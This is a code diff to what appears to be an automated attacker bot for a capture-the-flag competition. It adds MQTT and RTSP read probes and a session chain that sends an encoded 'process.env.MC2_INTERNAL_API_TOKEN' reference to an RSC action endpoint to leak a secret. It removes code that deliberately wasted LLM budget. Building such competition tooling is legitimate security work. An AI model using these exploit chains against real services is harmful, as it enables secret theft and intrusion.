@@ -8,21 +8,20 @@
 
 from __future__ import annotations
 
+import base64
+import json
+import re
 import time
 import threading
 from concurrent.futures import ThreadPoolExecutor
 
-from dataclasses import replace
-
 from . import ATTACK_PROFILE, __version__ as ATTACKER_VERSION
 from .audit import AuditLogger, Redactor
-from .config import AttackerConfig, FORCED_LLM_MODEL
+from .config import AttackerConfig
 from .egress import EgressError, EgressGateway, build_allowlists
 from .exploits import (
     Attempt,
     GrpcAttempt,
-    MqttAttempt,
-    RtspAttempt,
     auth_tamper_attempts,
     build_attempts,
     extract_internal_urls,
@@ -30,10 +29,6 @@ from .exploits import (
     observed_attempts,
     observed_grpc_attempts,
     observed_grpc_bootstrap,
-    observed_mqtt_attempts,
-    observed_mqtt_bootstrap,
-    observed_rtsp_attempts,
-    observed_rtsp_bootstrap,
     ssrf_pivot_attempts,
     tamper_token,
 )
@@ -41,7 +36,6 @@ from .flags import FlagPipeline, SubmitClient
 from .llm_advisor import (
     LLMAdvisor,
     MAX_LLM_CALLS_PER_ROUND,
-    BUDGET_BURN_EXTRA_MODEL,
 )
 from .models import (
     Capability,
@@ -58,14 +52,14 @@ from .phase_policy import FairScheduler, cumulative_endpoint_order
 from .planner import EndpointState, Planner, MAX_TURNS
 from .playbook import Playbook
 from .profiles import service_fingerprint, suggest_vuln_classes
+from .protocol_transport import MQTT_PORT, MQTT_READ_TOPICS, RTSP_DISCOVERY_PATHS, RTSP_PORT
 from .rate_limit import RateLimiter
 from .recon import COMMON_PROBE_PATHS, DISCOVERY_PROBE_PATHS
 from .round_report import RoundReport
-from .secrets import KIND_LLM_KEY, KIND_SUBMIT_TOKEN, RoundSecretStore
+from .secrets import KIND_LLM_KEY, KIND_SESSION, KIND_SUBMIT_TOKEN, RoundSecretStore
 from .tools import ExecutionAdapter, PlanBindingError, evasion_variants
 
-# 결정론 hit 여부와 무관하게 endpoint당 풀 LLM 턴을 강제한다($1360 소진).
-POST_DET_LLM_TURNS = MAX_TURNS
+MAX_LLM_TURNS_PER_ENDPOINT = 2
 LOOP_SLEEP = 4.0
 PER_TARGET_BUDGET = 1
 MAX_EVASION_VARIANTS = 6
@@ -83,8 +77,7 @@ class AttackerRuntime:
 
     def __init__(self, config: AttackerConfig, http=None, rate=None,
                  clock=time.monotonic, sleep=time.sleep, audit=None, budget=None):
-        # 어떤 경로로 config가 와도 LLM은 항상 강제 gpt-5.4-pro이다(실패 시 sol→terra).
-        self.config = replace(config, llm_model=FORCED_LLM_MODEL)
+        self.config = config
         self.transport = http or UrllibHttp()
         self.rate = rate or RateLimiter(clock=clock, sleep=sleep)
         self.clock = clock
@@ -136,7 +129,10 @@ class AttackerRuntime:
         evidence = EvidenceFactory(self._round_id, self.clock, EVIDENCE_TTL)
 
         self._observer = Observer(egress, self.rate, self._round_id, self.clock, evidence)
-        self._adapter = ExecutionAdapter(egress, self.rate, self._round_id, self.clock, evidence)
+        self._adapter = ExecutionAdapter(
+            egress, self.rate, self._round_id, self.clock, evidence,
+            secret_store=store,
+        )
         advisor = LLMAdvisor(egress, self.config, self.budget, store, llm_handle)
         self._planner = Planner(advisor)
         submit_client = SubmitClient(
@@ -403,6 +399,7 @@ class AttackerRuntime:
                 "rpc": attempt.rpc,
                 "string_fields": attempt.strings(),
                 "varint_fields": attempt.varints(),
+                "delivery": attempt.delivery,
             },
             plan_id=f"grpc-{self._round_id}-{endpoint.endpoint_id}-{now}",
             round_id=self._round_id,
@@ -428,6 +425,102 @@ class AttackerRuntime:
         return result, self._process_flags(
             result.body, result.observation.redacted_header_hints
         )
+
+    def _execute_protocol_attempt(self, endpoint, tool: str, args: dict,
+                                  evidence_ref, reason: str):
+        """관측된 MQTT/RTSP의 읽기 전용 계획을 공통 preflight로 실행한다."""
+        if self._stop_event.is_set():
+            return None, False
+        now = self.clock()
+        plan = ExecutionPlan(
+            tool=tool,
+            target=endpoint,
+            args=args,
+            plan_id=f"{tool}-{self._round_id}-{endpoint.endpoint_id}-{now}",
+            round_id=self._round_id,
+            endpoint_id=endpoint.endpoint_id,
+            capability=Capability.ATTACK_TARGET,
+            evidence_refs=[evidence_ref] if evidence_ref else [],
+            created_at_monotonic=now,
+            expires_at_monotonic=now + PLAN_TTL,
+            side_effect_class=SideEffectClass.READ_ONLY,
+            reason="det:" + reason,
+        )
+        try:
+            result = self._adapter.execute(plan)
+        except (PlanBindingError, EgressError):
+            return None, False
+        self._report.record_request()
+        self._remember_evidence(endpoint, result.observation.evidence_ref)
+        return result, self._process_flags(
+            result.body, result.observation.redacted_header_hints
+        )
+
+    def _attack_observed_mqtt(self, endpoint) -> tuple[bool, bool]:
+        """1883에서 MQTT를 확인한 뒤 wildcard read subscription만 수행한다."""
+        if endpoint.port != MQTT_PORT:
+            return False, False
+        obs, resp = self._observer.observe_mqtt(endpoint)
+        self._report.record_observation()
+        self._report.record_request()
+        self._remember_evidence(endpoint, obs.evidence_ref)
+        if resp.status == 0:
+            return False, False
+        with self._state_lock:
+            self._responsive_endpoints.add(endpoint.endpoint_id)
+        self.audit.log("protocol-observed", target=endpoint.key(), scheme="mqtt")
+        captured_any = self._process_flags(resp.body, resp.headers)
+        if resp.status != 200 or self._stop_event.is_set():
+            return True, captured_any
+        result, captured = self._execute_protocol_attempt(
+            endpoint,
+            "mqtt",
+            {"topics": list(MQTT_READ_TOPICS)},
+            obs.evidence_ref,
+            "observed:l3-mqtt-read-subscribe",
+        )
+        if captured:
+            captured_any = True
+            self.audit.log(
+                "hit", target=endpoint.key(), path="MQTT SUBSCRIBE",
+                reason="det:observed:l3-mqtt-read-subscribe",
+            )
+        return True, captured_any
+
+    def _attack_observed_rtsp(self, endpoint) -> tuple[bool, bool]:
+        """8554에서 RTSP OPTIONS로 확인 후 bounded DESCRIBE만 수행한다."""
+        if endpoint.port != RTSP_PORT:
+            return False, False
+        obs, resp = self._observer.observe_rtsp(endpoint, "OPTIONS", "*")
+        self._report.record_observation()
+        self._report.record_request()
+        self._remember_evidence(endpoint, obs.evidence_ref)
+        if resp.status == 0:
+            return False, False
+        with self._state_lock:
+            self._responsive_endpoints.add(endpoint.endpoint_id)
+        self.audit.log("protocol-observed", target=endpoint.key(), scheme="rtsp")
+        captured_any = self._process_flags(resp.body, resp.headers)
+        evidence_ref = obs.evidence_ref
+        for path in RTSP_DISCOVERY_PATHS:
+            if self._stop_event.is_set():
+                break
+            result, captured = self._execute_protocol_attempt(
+                endpoint,
+                "rtsp",
+                {"method": "DESCRIBE", "path": path},
+                evidence_ref,
+                "observed:l3-rtsp-describe",
+            )
+            if result is not None:
+                evidence_ref = result.observation.evidence_ref
+            if captured:
+                captured_any = True
+                self.audit.log(
+                    "hit", target=endpoint.key(), path=path,
+                    reason="det:observed:l3-rtsp-describe",
+                )
+        return True, captured_any
 
     def _attack_observed_grpc(self, endpoint) -> tuple:
         """본선 9000 gRPC를 HTTP 오탐 없이 bootstrap하고 bounded 후보를 실행한다.
@@ -532,6 +625,112 @@ class AttackerRuntime:
                     return name.strip(), value.strip()
         return None, None
 
+    def _attack_l2_session_chains(self, endpoint, evidence_ref) -> bool:
+        """Use a fresh guest session for the observed RSC and mission-feed reads.
+
+        Session plaintext is extracted into the Round secret store immediately and
+        only a ``SecretHandle`` crosses planning code.  It is resolved by the
+        execution adapter at the transport boundary.
+        """
+        if endpoint.port != 8082 or endpoint.scheme != "http" or evidence_ref is None:
+            return False
+
+        def plan(tool: str, args: dict, reason: str, current_evidence):
+            now = self.clock()
+            return ExecutionPlan(
+                tool=tool,
+                target=endpoint,
+                args=args,
+                plan_id=f"l2-{self._round_id}-{endpoint.endpoint_id}-{now}",
+                round_id=self._round_id,
+                endpoint_id=endpoint.endpoint_id,
+                capability=Capability.ATTACK_TARGET,
+                evidence_refs=[current_evidence],
+                created_at_monotonic=now,
+                expires_at_monotonic=now + PLAN_TTL,
+                side_effect_class=SideEffectClass.READ_ONLY,
+                reason=reason,
+            )
+
+        try:
+            session_result = self._adapter.execute(plan(
+                "http",
+                {
+                    "method": "POST",
+                    "path": "/api/session",
+                    "headers": {"Accept": "application/json"},
+                    "body": "",
+                },
+                "det:observed:l2-session-bootstrap",
+                evidence_ref,
+            ))
+        except (PlanBindingError, EgressError):
+            return False
+        self._report.record_request()
+        self._remember_evidence(endpoint, session_result.observation.evidence_ref)
+        try:
+            document = json.loads(session_result.body)
+        except (TypeError, json.JSONDecodeError):
+            return False
+        token = document.get("sessionToken") if isinstance(document, dict) else None
+        if not isinstance(token, str) or re.fullmatch(r"[0-9a-fA-F]{32}", token) is None:
+            return False
+        session_handle = self._secret_store.put(KIND_SESSION, token)
+
+        captured_any = False
+        current_evidence = session_result.observation.evidence_ref
+        ref = base64.b64encode(b"process.env.MC2_INTERNAL_API_TOKEN").decode("ascii")
+        rsc_plan = plan(
+            "http",
+            {
+                "method": "POST",
+                "path": "/api/rsc-action",
+                "headers": {"Accept": "application/json"},
+                "json_body": {"ref": ref, "token": session_handle},
+            },
+            "det:observed:l2-rsc-fresh-session",
+            current_evidence,
+        )
+        try:
+            rsc_result = self._adapter.execute(rsc_plan)
+        except (PlanBindingError, EgressError):
+            rsc_result = None
+        if rsc_result is not None:
+            self._report.record_request()
+            self._remember_evidence(endpoint, rsc_result.observation.evidence_ref)
+            current_evidence = rsc_result.observation.evidence_ref
+            if self._process_flags(
+                rsc_result.body, rsc_result.observation.redacted_header_hints
+            ):
+                captured_any = True
+                self.audit.log(
+                    "hit", target=endpoint.key(), path="/api/rsc-action",
+                    reason="det:observed:l2-rsc-fresh-session",
+                )
+
+        ws_plan = plan(
+            "websocket",
+            {"path": "/ws/mission-feed", "token": session_handle},
+            "det:observed:l2-ws-fresh-session",
+            current_evidence,
+        )
+        try:
+            ws_result = self._adapter.execute(ws_plan)
+        except (PlanBindingError, EgressError):
+            ws_result = None
+        if ws_result is not None:
+            self._report.record_request()
+            self._remember_evidence(endpoint, ws_result.observation.evidence_ref)
+            if self._process_flags(
+                ws_result.body, ws_result.observation.redacted_header_hints
+            ):
+                captured_any = True
+                self.audit.log(
+                    "hit", target=endpoint.key(), path="/ws/mission-feed",
+                    reason="det:observed:l2-ws-fresh-session",
+                )
+        return captured_any
+
     def _deterministic_exploit(self, endpoint, banner, banner_fp,
                                banner_headers, evidence_ref, attempts=None,
                                attempted_keys=None, include_cookie_tamper=True,
@@ -618,182 +817,20 @@ class AttackerRuntime:
                 run(attempt)
         return captured_any
 
-    def _execute_mqtt_attempt(self, endpoint, attempt: MqttAttempt, evidence_ref):
-        if self._stop_event.is_set():
-            return None, False
-        now = self.clock()
-        plan = ExecutionPlan(
-            tool="mqtt",
-            target=endpoint,
-            args={"topics": list(attempt.topics)},
-            plan_id=f"mqtt-{self._round_id}-{endpoint.endpoint_id}-{now}",
-            round_id=self._round_id,
-            endpoint_id=endpoint.endpoint_id,
-            capability=Capability.ATTACK_TARGET,
-            evidence_refs=[evidence_ref] if evidence_ref else [],
-            created_at_monotonic=now,
-            expires_at_monotonic=now + PLAN_TTL,
-            side_effect_class=SideEffectClass.READ_ONLY,
-            reason="det:" + attempt.reason,
-        )
-        try:
-            result = self._adapter.execute(plan)
-        except (PlanBindingError, EgressError):
-            return None, False
-        self._report.record_request()
-        self._remember_evidence(endpoint, result.observation.evidence_ref)
-        if self._stop_event.is_set():
-            return result, False
-        return result, self._process_flags(
-            result.body, result.observation.redacted_header_hints
-        )
-
-    def _attack_observed_mqtt(self, endpoint) -> tuple:
-        if not observed_mqtt_bootstrap(endpoint.port):
-            return False, False
-        obs, resp = self._observer.observe_mqtt(endpoint, ("#",))
-        self._report.record_observation()
-        self._report.record_request()
-        self._remember_evidence(endpoint, obs.evidence_ref)
-        if resp.status == 0:
-            return False, False
-        with self._state_lock:
-            self._responsive_endpoints.add(endpoint.endpoint_id)
-        self.audit.log("protocol-observed", target=endpoint.key(), scheme="mqtt")
-        captured_any = self._process_flags(resp.body, resp.headers)
-        evidence_ref = obs.evidence_ref
-        for attempt in observed_mqtt_attempts(endpoint.port):
-            if self._stop_event.is_set():
-                break
-            result, captured = self._execute_mqtt_attempt(
-                endpoint, attempt, evidence_ref
-            )
-            if result is not None:
-                evidence_ref = result.observation.evidence_ref
-            if captured:
-                captured_any = True
-                self.audit.log(
-                    "hit",
-                    target=endpoint.key(),
-                    path=",".join(attempt.topics[:3]),
-                    vuln=attempt.vuln.value,
-                    reason="det:" + attempt.reason,
-                )
-        return True, captured_any
-
-    def _execute_rtsp_attempt(self, endpoint, attempt: RtspAttempt, evidence_ref):
-        if self._stop_event.is_set():
-            return None, False
-        now = self.clock()
-        plan = ExecutionPlan(
-            tool="rtsp",
-            target=endpoint,
-            args={
-                "method": attempt.method,
-                "path": attempt.path,
-                "headers": dict(attempt.extra_headers),
-            },
-            plan_id=f"rtsp-{self._round_id}-{endpoint.endpoint_id}-{now}",
-            round_id=self._round_id,
-            endpoint_id=endpoint.endpoint_id,
-            capability=Capability.ATTACK_TARGET,
-            evidence_refs=[evidence_ref] if evidence_ref else [],
-            created_at_monotonic=now,
-            expires_at_monotonic=now + PLAN_TTL,
-            side_effect_class=SideEffectClass.READ_ONLY,
-            reason="det:" + attempt.reason,
-        )
-        try:
-            result = self._adapter.execute(plan)
-        except (PlanBindingError, EgressError):
-            return None, False
-        self._report.record_request()
-        self._remember_evidence(endpoint, result.observation.evidence_ref)
-        if self._stop_event.is_set():
-            return result, False
-        return result, self._process_flags(
-            result.body, result.observation.redacted_header_hints
-        )
-
-    def _attack_observed_rtsp(self, endpoint) -> tuple:
-        if not observed_rtsp_bootstrap(endpoint.port):
-            return False, False
-        obs, resp = self._observer.observe_rtsp(endpoint, "OPTIONS", "*")
-        self._report.record_observation()
-        self._report.record_request()
-        self._remember_evidence(endpoint, obs.evidence_ref)
-        if resp.status == 0:
-            return False, False
-        with self._state_lock:
-            self._responsive_endpoints.add(endpoint.endpoint_id)
-        self.audit.log("protocol-observed", target=endpoint.key(), scheme="rtsp")
-        captured_any = self._process_flags(resp.body, resp.headers)
-        evidence_ref = obs.evidence_ref
-        for attempt in observed_rtsp_attempts(endpoint.port):
-            if self._stop_event.is_set():
-                break
-            result, captured = self._execute_rtsp_attempt(
-                endpoint, attempt, evidence_ref
-            )
-            if result is not None:
-                evidence_ref = result.observation.evidence_ref
-            if captured:
-                captured_any = True
-                self.audit.log(
-                    "hit",
-                    target=endpoint.key(),
-                    path=f"{attempt.method} {attempt.path}",
-                    vuln=attempt.vuln.value,
-                    reason="det:" + attempt.reason,
-                )
-        return True, captured_any
-
     # ---- 단일 표적 공격 ----
 
     def attack_endpoint(self, endpoint) -> bool:
         if self._stop_event.is_set():
             return False
-        grpc_handled, grpc_captured = self._attack_observed_grpc(endpoint)
-        if grpc_handled:
-            # 9000도 LiteLLM 예산을 태운다(합성 배너 → HTTP plan은 실패해도 호출 비용은 발생).
-            return self._burn_llm_on_endpoint(
-                endpoint,
-                banner=(
-                    "gRPC satdiag.v1.SatDiag on this port. Prefer Export/Tail/Probe "
-                    "creative payloads; also suggest sibling :8080 HTTP pivots "
-                    "(/portal, /svc/flag-*, /graphql)."
-                ),
-                banner_fp=f"grpc:{endpoint.port}",
-                evidence_ref=None,
-                already_captured=grpc_captured,
-            )
         mqtt_handled, mqtt_captured = self._attack_observed_mqtt(endpoint)
         if mqtt_handled:
-            return self._burn_llm_on_endpoint(
-                endpoint,
-                banner=(
-                    "MQTT broker on this port. Prefer topic wildcards, $SYS, "
-                    "uav/drone/telemetry/flag topics; look for FLAG in PUBLISH payloads. "
-                    "HTTP paths may also be suggested for sibling ports."
-                ),
-                banner_fp=f"mqtt:{endpoint.port}",
-                evidence_ref=None,
-                already_captured=mqtt_captured,
-            )
+            return mqtt_captured
         rtsp_handled, rtsp_captured = self._attack_observed_rtsp(endpoint)
         if rtsp_handled:
-            return self._burn_llm_on_endpoint(
-                endpoint,
-                banner=(
-                    "RTSP media server on this port. Prefer DESCRIBE paths "
-                    "/stream /live /uav /flag and SDP bodies for FLAG. "
-                    "HTTP paths may also be suggested for sibling ports."
-                ),
-                banner_fp=f"rtsp:{endpoint.port}",
-                evidence_ref=None,
-                already_captured=rtsp_captured,
-            )
-        # protocol 전용 포트가 아니면 HTTP/LLM 경로로 이어간다.
+            return rtsp_captured
+        grpc_handled, grpc_captured = self._attack_observed_grpc(endpoint)
+        if grpc_handled:
+            return grpc_captured
         obs, resp, endpoint, bootstrap_requests = self._observer.observe_banner_adaptive(endpoint)
         for _ in range(bootstrap_requests):
             self._report.record_observation()
@@ -839,11 +876,15 @@ class AttackerRuntime:
         captured_any = self._process_flags(resp.body, resp.headers)
         if captured_any:
             self.audit.log("hit", target=endpoint.key(), turn=0, path="/", reason="banner")
-            # 배너 flag만으로 끝내지 않는다 — 같은 서비스의 추가 flag + LiteLLM 호출을 이어간다.
+
+        captured_any = (
+            self._attack_l2_session_chains(endpoint, current_evidence) or captured_any
+        )
+        current_evidence = self._latest_evidence(endpoint, current_evidence)
 
         attempted_keys = set()
 
-        # TEAM1 PCAP에서 성공이 확인된 L1~L3 형태를 얇게 먼저 친 뒤, LLM을 본체로 돌린다.
+        # TEAM1 PCAP에서 성공이 확인된 L1~L3 형태를 일반 정찰보다 먼저 실행한다.
         confirmed = observed_attempts(endpoint.port)
         observed_only = not bool(confirmed)
         if confirmed:
@@ -851,22 +892,6 @@ class AttackerRuntime:
                 endpoint, banner, banner_fp, resp.headers, current_evidence,
                 attempts=confirmed, attempted_keys=attempted_keys,
                 include_cookie_tamper=False) or captured_any
-        if self._stop_event.is_set():
-            return captured_any
-        current_evidence = self._latest_evidence(endpoint, current_evidence)
-
-        # LLM-first: 결정론 전체 소진 전에 frontier 조언을 실행·제출한다.
-        self.audit.log(
-            "llm-primary", target=endpoint.key(),
-            after_confirmed_det=bool(confirmed),
-        )
-        captured_any = self._burn_llm_on_endpoint(
-            endpoint,
-            banner=banner,
-            banner_fp=banner_fp,
-            evidence_ref=current_evidence,
-            already_captured=captured_any,
-        ) or captured_any
         if self._stop_event.is_set():
             return captured_any
         current_evidence = self._latest_evidence(endpoint, current_evidence)
@@ -891,7 +916,7 @@ class AttackerRuntime:
             return captured_any
         observed_banner = "\n".join(part for part in (banner, discovery) if part)
 
-        # 결정론 백업 — LLM이 놓친 관측 경로를 이어서 친다.
+        # 결정론적 exploit 엔진 — 관측된 route·parameter를 우선해 LLM 전에 실행한다.
         captured_any = self._deterministic_exploit(
             endpoint, observed_banner, banner_fp, resp.headers, current_evidence,
             attempted_keys=attempted_keys,
@@ -900,13 +925,12 @@ class AttackerRuntime:
             return captured_any
         current_evidence = self._latest_evidence(endpoint, current_evidence)
 
+        # 한 서비스에 flag가 여러 개일 수 있으므로 결정론·recon 경로는 모두 돈다.
+        # 이미 하나 이상 회수했다면 비용성 LLM 단계만 생략한다.
         if captured_any:
-            self.audit.log(
-                "det-complete", target=endpoint.key(),
-                continuing_to_llm=True,
-            )
+            return True
 
-        # playbook 재사용 후 LLM을 한 번 더 태워 예산을 소진한다.
+        # playbook 재사용은 LLM보다 먼저 시도한다.
         tried_reuse = False
         while not self._stop_event.is_set():
             known = self._playbook.lookup(banner_fp)
@@ -935,7 +959,7 @@ class AttackerRuntime:
                 continue
             break
 
-        return self._burn_llm_on_endpoint(
+        return self._advise_llm_on_endpoint(
             endpoint,
             banner=observed_banner,
             banner_fp=banner_fp,
@@ -943,9 +967,9 @@ class AttackerRuntime:
             already_captured=captured_any,
         ) or captured_any
 
-    def _burn_llm_on_endpoint(self, endpoint, banner: str, banner_fp: str,
-                              evidence_ref, already_captured: bool = False) -> bool:
-        """표적마다 MAX_TURNS×(pro+gpt-5-pro) LiteLLM 호출을 강제한다."""
+    def _advise_llm_on_endpoint(self, endpoint, banner: str, banner_fp: str,
+                                evidence_ref, already_captured: bool = False) -> bool:
+        """Use a bounded low-cost LLM fallback only after deterministic misses."""
         if self._planner is None or getattr(self._planner._advisor, "_key_handle", None) is None:
             self.audit.log(
                 "llm-skip", target=endpoint.key(),
@@ -969,7 +993,7 @@ class AttackerRuntime:
             except Exception:
                 current_evidence = evidence_ref
 
-        llm_turn_limit = MAX_TURNS
+        llm_turn_limit = min(MAX_TURNS, MAX_LLM_TURNS_PER_ENDPOINT)
         state = EndpointState(endpoint)
         feedback = ""
         try:
@@ -978,25 +1002,13 @@ class AttackerRuntime:
                 state.turn += 1
                 plan = self._planner.plan_next(endpoint, banner, feedback, state,
                                                model=self.config.llm_model)
-                # $1360 소진: 매 턴 gpt-5-pro를 한 번 더 호출(결과는 버리고 비용만 발생).
-                if BUDGET_BURN_EXTRA_MODEL:
-                    hints = suggest_vuln_classes(banner)
-                    self._planner._advisor.advise_exploit(
-                        banner=banner, feedback=feedback, hints=hints,
-                        model=BUDGET_BURN_EXTRA_MODEL,
-                    )
                 if plan is None:
                     self.audit.log(
                         "llm-skip", target=endpoint.key(), turn=state.turn,
                         reason="advise-empty-or-failed",
                         model=self.config.llm_model,
                     )
-                    # 한 턴 실패로 전체 LLM 루프를 끊지 않는다 — 다음 턴·fallback 계속.
-                    feedback = (
-                        "Previous advice empty or unusable. Reply ONLY valid JSON with "
-                        "vuln, method, path, headers, body, reason for this port."
-                    )
-                    continue
+                    break
                 self.audit.log(
                     "llm-plan", target=endpoint.key(), turn=state.turn,
                     path=plan.args.get("path"), model=self.config.llm_model,
@@ -1055,7 +1067,7 @@ class AttackerRuntime:
                                    path=plan.args["path"], vuln=str(plan.scenario),
                                    reason=plan.reason)
                     captured_any = True
-                    # hit 후에도 턴 한도까지 계속 돌려 크레딧을 소진한다.
+                    break
 
                 current_evidence = result.observation.evidence_ref
                 if result.outcome == Outcome.TIMEOUT:
